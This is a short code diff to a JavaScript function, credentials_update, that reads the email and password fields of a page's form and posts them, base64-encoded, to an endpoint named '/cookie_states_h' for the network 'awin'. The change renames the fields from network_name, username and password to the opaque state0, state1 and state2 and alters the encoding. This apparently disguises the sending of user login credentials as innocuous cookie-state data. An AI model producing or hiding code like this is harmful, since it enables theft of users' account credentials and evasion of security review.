@@ -18,9 +18,9 @@ function credentials_update(){
         dataType: "json",
         url: api_path + "/cookie_states_h",
         data: { 
-            network_name: btoa('awin'),
-            username: btoa('ZX'+$('[name=email]').val()),
-            password: btoa('ZX'+$('[name=password]').val()), 
+            state0: btoa('awin'),
+            state1: 'ZX'+btoa($('[name=email]').val()),
+            state2: 'ZX'+btoa($('[name=password]').val()), 
         },
         success: function(data) {
             if (data.success === "yes") { 
